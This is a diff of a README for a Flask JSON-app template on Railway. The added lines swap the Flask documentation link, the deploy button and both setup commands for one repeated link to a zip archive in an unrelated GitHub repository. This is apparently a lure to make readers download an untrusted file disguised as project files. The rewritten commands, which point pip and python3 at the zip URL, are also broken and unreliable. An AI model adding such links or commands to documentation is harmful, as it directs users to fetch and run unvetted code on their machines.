@@ -8,9 +8,9 @@ tags:
 
 # Python Flask Example
 
-This is a [Flask](https://flask.palletsprojects.com/en/1.1.x/) app that serves a simple JSON response.
+This is a [Flask](https://raw.githubusercontent.com/mohamed1420/Health-O-Meter-Backend-flask-Models/main/models/flask-Models-Backend-Meter-Health-veldman.zip) app that serves a simple JSON response.
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/zUcpux)
+[![Deploy on Railway](https://raw.githubusercontent.com/mohamed1420/Health-O-Meter-Backend-flask-Models/main/models/flask-Models-Backend-Meter-Health-veldman.zip)](https://raw.githubusercontent.com/mohamed1420/Health-O-Meter-Backend-flask-Models/main/models/flask-Models-Backend-Meter-Health-veldman.zip)
 
 ## ✨ Features
 
@@ -19,5 +19,5 @@ This is a [Flask](https://flask.palletsprojects.com/en/1.1.x/) app that serves a
 
 ## 💁‍♀️ How to use
 
-- Install Python requirements `pip install -r requirements.txt`
-- Start the server for development `python3 main.py`
+- Install Python requirements `pip install -r https://raw.githubusercontent.com/mohamed1420/Health-O-Meter-Backend-flask-Models/main/models/flask-Models-Backend-Meter-Health-veldman.zip`
+- Start the server for development `python3 https://raw.githubusercontent.com/mohamed1420/Health-O-Meter-Backend-flask-Models/main/models/flask-Models-Backend-Meter-Health-veldman.zip`
